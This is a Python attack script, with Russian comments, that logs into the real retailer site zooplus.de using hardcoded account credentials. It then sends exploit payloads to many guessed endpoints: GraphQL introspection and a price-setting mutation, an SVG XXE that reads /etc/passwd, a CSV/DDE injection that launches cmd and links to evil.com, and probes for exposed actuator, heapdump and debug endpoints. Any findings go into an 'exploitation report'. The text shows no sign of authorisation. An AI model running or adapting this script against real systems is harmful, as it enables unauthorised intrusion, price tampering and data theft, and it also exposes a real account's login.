#!/usr/bin/env python3
"""Aggressive Top-5 Vectors Test"""
import requests
import re
import json
import urllib.parse
from datetime import datetime
import urllib3
urllib3.disable_warnings()

ACCOUNT = {"email": "suobup@dunkos.xyz", "password": "suobup@dunkos.xyzQ1"}
AUTH_URL = "https://login.zooplus.de/auth/realms/zooplus/protocol/openid-connect/auth"
base = "https://www.zooplus.de"
s = requests.Session()
UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}

# LOGIN
print("[*] Login...")
try:
    params = {"response_type": "code", "client_id": "shop-myzooplus-prod-zooplus", "redirect_uri": "https://www.zooplus.de/web/sso-myzooplus/login", "state": "pentest", "login": "true", "ui_locales": "de-DE", "scope": "openid"}
    r1 = s.get(AUTH_URL, params=params, headers=UA, verify=False)
    m = re.search(r'action="([^"]*login-actions/[^"]+)"', r1.text)
    action = m.group(1).replace("&amp;", "&")
    if not action.startswith("http"):
        action = urllib.parse.urljoin(r1.url, action)
    r2 = s.post(action, data={"username": ACCOUNT["email"], "password": ACCOUNT["password"], "credentialId": ""}, headers=UA, allow_redirects=False, verify=False)
    loc = r2.headers.get("Location", "")
    s.get(loc, headers=UA, allow_redirects=True, verify=False)
    s.get("https://www.zooplus.de/web/sso-myzooplus/login-successful.htm", headers=UA, verify=False)
    s.get("https://www.zooplus.de/account/overview", headers=UA, verify=False)
    csrf = s.cookies.get("csrfToken")
    if csrf:
        s.headers.update({"x-csrf-token": csrf, "Accept": "application/json", "Content-Type": "application/json"})
    print("[+] Logged in")
except Exception as e:
    print(f"[!] Login failed: {e}")
    exit(1)

found_vulns = []

# 1. GRAPHQL - расширенный поиск
print("\n[1] GraphQL - расширенный поиск...")
graphql_paths = [
    "/graphql", "/api/graphql", "/graphql/v1", "/graphql/v2",
    "/api/v1/graphql", "/api/v2/graphql", "/rest/graphql",
    "/shop/graphql", "/checkout/graphql", "/myaccount/graphql",
]

introspection = {"query": "{__schema{types{name,fields{name}}}}"}
batch_mutation = {"query": "mutation{setArticlePrice(articleId:1,price:0.01){success}}"}
batch_query = {"query": "{orders{id,price}}", "variables": {}}

for path in graphql_paths:
    for payload in [introspection, batch_mutation, batch_query]:
        try:
            resp = s.post(f"{base}{path}", json=payload, timeout=3, verify=False)
            if resp.status_code == 200:
                data = resp.json() if 'application/json' in resp.headers.get('Content-Type', '') else {}
                data_str = json.dumps(data)
                if '__schema' in data_str or 'types' in data_str:
                    print(f"  [CRITICAL] GraphQL Introspection: {path}")
                    found_vulns.append({"type": "graphql_introspection", "severity": "CRITICAL", "endpoint": path})
                if 'setArticlePrice' in data_str or 'mutation' in data_str.lower():
                    print(f"  [CRITICAL] GraphQL Mutation: {path}")
                    found_vulns.append({"type": "graphql_mutation", "severity": "CRITICAL", "endpoint": path})
                break
        except: pass

# 2. SVG XXE - больше endpoints
print("\n[2] SVG XXE - расширенный поиск...")
svg_xxe = '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>'

upload_paths = [
    "/myaccount/api/avatar/upload", "/api/upload", "/api/file/upload",
    "/api/review/upload", "/api/reviews/upload", "/myaccount/api/upload",
    "/checkout/api/upload", "/semiprotected/api/upload",
    "/api/v1/upload", "/api/v2/upload", "/rest/api/upload",
    "/api/media/upload", "/api/images/upload", "/api/attachment/upload",
    "/myaccount/avatar", "/account/avatar", "/profile/avatar",
]

for path in upload_paths:
    try:
        files = {'file': ('x.svg', svg_xxe, 'image/svg+xml')}
        resp = s.post(f"{base}{path}", files=files, timeout=3, verify=False)
        if resp.status_code in [200, 201, 302]:
            if "root:x:0:0" in resp.text or "root:" in resp.text:
                print(f"  [CRITICAL] SVG XXE: {path}")
                found_vulns.append({"type": "svg_xxe", "severity": "CRITICAL", "endpoint": path, "response": resp.text[:500]})
            elif resp.headers.get('Location'):
                loc = resp.headers.get('Location')
                # Check uploaded file
                if loc:
                    resp2 = s.get(loc if loc.startswith('http') else f"{base}{loc}", timeout=3, verify=False)
                    if "root:" in resp2.text:
                        print(f"  [CRITICAL] SVG XXE via uploaded file: {path} -> {loc}")
                        found_vulns.append({"type": "svg_xxe", "severity": "CRITICAL", "endpoint": path, "location": loc})
    except: pass

# 3. ACTUATOR - все варианты
print("\n[3] Actuator - все варианты...")
actuator_bases = ["/actuator", "/api/actuator", "/admin/actuator", "/management", "/api/management"]
actuator_paths = ["env", "heapdump", "jolokia", "loggers", "mappings", "health", "info", "metrics", "trace"]

for base_path in actuator_bases:
    for path in actuator_paths:
        try:
            resp = s.get(f"{base}{base_path}/{path}", timeout=2, verify=False)
            if resp.status_code == 200 and len(resp.text) > 50:
                print(f"  [CRITICAL] Actuator: {base_path}/{path}")
                content = resp.text
                if any(x in content.lower() for x in ['password', 'secret', 'key']):
                    print(f"      Contains sensitive data!")
                found_vulns.append({"type": "actuator_exposure", "severity": "CRITICAL", "endpoint": f"{base_path}/{path}", "response": content[:500]})
        except: pass

# 4. CSV IMPORT - поиск реальных endpoints
print("\n[4] CSV Import - поиск endpoints...")
csv_payload = "=cmd|'/c calc'!A0\n=HYPERLINK(\"http://evil.com\")"

import_paths = [
    "/api/import/csv", "/api/import", "/admin/upload", "/partner/import",
    "/api/autoshipment/import", "/api/b2b/import", "/myaccount/api/import",
    "/checkout/api/import", "/semiprotected/api/import",
    "/api/v1/import", "/api/v2/import", "/rest/api/import",
]

for path in import_paths:
    try:
        files = {'file': ('x.csv', csv_payload, 'text/csv')}
        resp = s.post(f"{base}{path}", files=files, timeout=3, verify=False)
        if resp.status_code in [200, 201]:
            print(f"  [HIGH] CSV import endpoint: {path}")
            if "calc" in resp.text.lower() or "error" in resp.text.lower():
                print(f"  [CRITICAL] CSV injection: {path}")
                found_vulns.append({"type": "csv_injection", "severity": "CRITICAL", "endpoint": path})
    except: pass

# 5. DEBUG ENDPOINTS
print("\n[5] Debug endpoints...")
debug_paths = [
    "/debug", "/api/debug", "/admin/debug",
    "/env", "/api/env", "/admin/env",
    "/health", "/api/health", "/admin/health",
]

for path in debug_paths:
    try:
        resp = s.get(f"{base}{path}", timeout=2, verify=False)
        if resp.status_code == 200 and len(resp.text) > 50:
            content = resp.text.lower()
            if any(x in content for x in ['debug', 'env', 'config', 'secret']):
                print(f"  [HIGH] Debug endpoint: {path}")
                found_vulns.append({"type": "debug_exposure", "severity": "HIGH", "endpoint": path, "response": resp.text[:500]})
    except: pass

# SUMMARY
print("\n" + "=" * 70)
print("RESULTS")
print("=" * 70)

if found_vulns:
    print(f"Found {len(found_vulns)} vulnerabilities:")
    for v in found_vulns:
        print(f"  [{v['severity']}] {v['type']}: {v['endpoint']}")
    
    # Update report
    with open("FINAL_EXPLOITATION_REPORT.md", "a", encoding="utf-8") as f:
        f.write(f"\n\n---\n\n## 🔥 КРИТИЧНЫЕ УЯЗВИМОСТИ\n\n**Date:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        for v in found_vulns:
            f.write(f"### [{v['severity']}] {v['type'].upper().replace('_', ' ')}\n\n")
            f.write(f"**Endpoint:** `{v['endpoint']}`\n\n")
            f.write(f"**Status:** Подтверждено\n\n")
            if 'response' in v:
                f.write(f"**Response:** `{v['response'][:500]}`\n\n")
            if 'location' in v:
                f.write(f"**Uploaded to:** `{v['location']}`\n\n")
            f.write("---\n\n")
    
    print(f"\n[+] Report updated")
else:
    print("  No vulnerabilities found")

print("=" * 70)

